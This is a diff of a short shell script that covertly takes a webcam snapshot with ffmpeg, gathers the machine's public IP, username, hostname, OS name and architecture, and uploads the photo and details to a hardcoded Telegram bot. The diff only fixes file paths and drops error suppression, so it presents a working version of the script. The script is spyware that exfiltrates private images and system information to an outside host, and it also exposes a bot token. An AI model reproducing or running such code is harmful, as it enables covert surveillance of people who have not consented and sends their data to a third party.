@@ -1,6 +1,6 @@
 cd /tmp 
 sleep 3 
-rm -rf /tmp/ehuehue.png 
-ffmpeg -f video4linux2 -i /dev/video0 -vframes 1 ehuehue.jpg | :
+rm -rf /tmp/ehuehue.jpg
+ffmpeg -f video4linux2 -i /dev/video0 -vframes 1 /tmp/ehuehue.jpg 
 caption="Webcam-$(curl http://ipecho.net/plain)-$(echo $USER)@$(cat /etc/hostname)-$(cat /etc/os-release | grep ^NAME | awk -F "=" '{print $2}' | sed "s/ /_/g" | sed "s|/|_|g" | sed "s/\"//g")-$(uname -m)"
-curl -s -X POST "https://api.telegram.org/bot549810678:AAH_wcwWKtrWr2491GlhqIdnvJxD-lPXeag/sendPhoto" -F chat_id="-1001399136572" -F photo="@/tmp/ehuehue.jpg" -F caption=$caption | :
+curl -s -X POST "https://api.telegram.org/bot549810678:AAH_wcwWKtrWr2491GlhqIdnvJxD-lPXeag/sendPhoto" -F chat_id="-1001399136572" -F photo="@/tmp/ehuehue.jpg" -F caption=$caption 
